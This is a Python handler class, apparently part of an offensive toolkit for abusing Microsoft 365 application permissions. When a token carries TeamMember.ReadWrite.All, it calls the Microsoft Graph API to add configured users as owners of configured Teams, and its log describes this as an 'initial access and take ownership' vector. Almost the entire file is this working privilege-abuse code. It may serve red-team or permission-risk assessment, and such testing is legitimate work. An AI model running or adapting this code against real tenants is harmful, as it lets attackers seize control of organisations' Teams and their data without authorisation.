from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.team_member_handler')


class TeamMember_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "TeamMember.ReadWrite.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to team_member_rw_all vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "TeamMemberRWVectors"
            message = ""
            error = "TeamMemberRWVectors - failed"
            conf = request.attack_config['TeamsMemSettings']
            
            logger.debug("TeamMember.ReadWrite.All - Add and remove members from teams, on behalf of the signed-in user. Also allows changing a member's role, for example from owner to non-owner.")
            
            logger.debug("Attack vector - initial access and take ownership.")         
            try:
                for team in conf["teamNames"]:
                    create_message_URL = "https://graph.microsoft.com/beta/teams/" + team + "/members"
                    for user in conf["users"]:

                        message_obj = {
                            "@odata.type": "#microsoft.graph.aadUserConversationMember",
                            "roles": ["owner"],
                            "user@odata.bind": "https://graph.microsoft.com/v1.0/users('" + user + "')"
                        }
                        result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)

                        if result.status_code == 201:
                            message += "added user: %s to: %s\n" % (user, team)
                            status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in team_member_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
